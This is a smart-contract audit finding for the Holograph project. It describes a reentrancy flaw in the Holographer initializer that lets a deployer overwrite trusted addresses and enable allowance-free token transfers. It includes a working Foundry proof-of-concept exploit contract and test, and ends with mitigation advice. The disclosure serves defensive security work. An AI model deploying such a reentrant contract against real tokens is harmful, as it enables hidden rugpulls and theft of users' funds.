## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- sponsor confirmed
- selected for report
- responded

# [Holographable tokens can be reinitialized](https://github.com/code-423n4/2022-10-holograph-findings/issues/215) 

# Lines of code

https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L147-L169


# Vulnerability details

When new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.

However, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`. 

One way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.

## Proof of Concept:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../contracts/HolographFactory.sol";
import "../contracts/HolographRegistry.sol";
import "../contracts/Holograph.sol";
import "../contracts/enforcer/HolographERC20.sol";

//Contract used to show reentrancy in initializer
contract SourceContract {
    address public holographer;
    MockContract public mc;

    constructor() {
         mc = new MockContract();
    }

    //function that reenters the holographer and sets this contract as the new holograph slot
    function init(bytes memory initPayload) external returns(bytes4) {
        assembly {
            sstore(holographer.slot, caller())
        }
        bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32("0xabc"), address(this)), bytes("0x0")); 
        holographer.call(abi.encodeWithSignature("init(bytes)", initCode));
        return InitializableInterface.init.selector;
    }

    function getRegistry() external view returns (address) {
        return address(this);
    }

    function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {
        return address(mc);
    }

    function isTheHolograph() external pure returns (bool) {
        return true;
    }

}

//simple extension contract to return easily during reinitialization
contract MockContract {
    constructor() {}

    function init(bytes memory initPayload) external pure returns(bytes4) {
        return InitializableInterface.init.selector;
    }
}

contract HolographTest is Test {
    DeploymentConfig public config;
    Verification public verifiedSignature;
    HolographFactory public hf;
    HolographRegistry public hr;
    Holograph public h;
    HolographERC20 public he20;

    uint256 internal userPrivateKey;
    address internal hrAdmin;
    mapping(uint256 => bool) public _burnedTokens;
    address internal user;
    function setUp() public {
        //Creating all of the required objects
        hf = new HolographFactory();
        hr = new HolographRegistry();
        h = new Holograph();
        he20 = new HolographERC20();

        //Setting up the registry admin
        hrAdmin = vm.addr(100);

        //Creating factory, holograph, and registry init payloads
        bytes memory hfInitPayload = abi.encode(address(h), address(hr));
        hf.init(hfInitPayload);
        bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));
        h.init(hInitPayload);
        bytes32[] memory reservedTypes = new bytes32[](1);
        reservedTypes[0] = "0xabc";
        bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);

        //Setting up a contract type address for the ERC20 enforcer
        vm.startPrank(hrAdmin, hrAdmin);
        hr.init(hrInitPayload);
        hr.setContractTypeAddress(reservedTypes[0], address(he20));
        vm.stopPrank();

        //Keys used to sign transaction for deployment
        userPrivateKey = 0x1337;
        user = vm.addr(userPrivateKey);
    }

    function testDeployShadyHolographer() public {
        //setting up the configuration, contract type is not important
        config.contractType = "0xabc";
        config.chainType = 1;
        config.salt = "0x12345";
        config.byteCode = type(SourceContract).creationCode;
        bytes memory initCode = "0x123";

        //giving our token some semi-realistic metadata
        config.initCode = abi.encode("HToken", "HT", uint8(18), uint256(0), "HTdomainSeparator", "HTdomainVersion", false, initCode);

        //creating the hash for our user to sign
        bytes32 hash = keccak256(
            abi.encodePacked(
                config.contractType,
                config.chainType,
                config.salt,
                keccak256(config.byteCode),
                keccak256(config.initCode),
                user
            ));

        //signing the hash and creating the verified signature
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);
        verifiedSignature.r = r;
        verifiedSignature.v = v;
        verifiedSignature.s = s;

        //deploying our new source contract and holographable contract pair
        hf.deployHolographableContract(config, verifiedSignature, user);

        //after the reentrancy has affected the initialization, we grab the holographer address from the registry
        address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));

        //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract
        assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);
    }
}
```
## Recommended Mitigation Steps

Consider checking whether the contract is in an "initializing" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements.
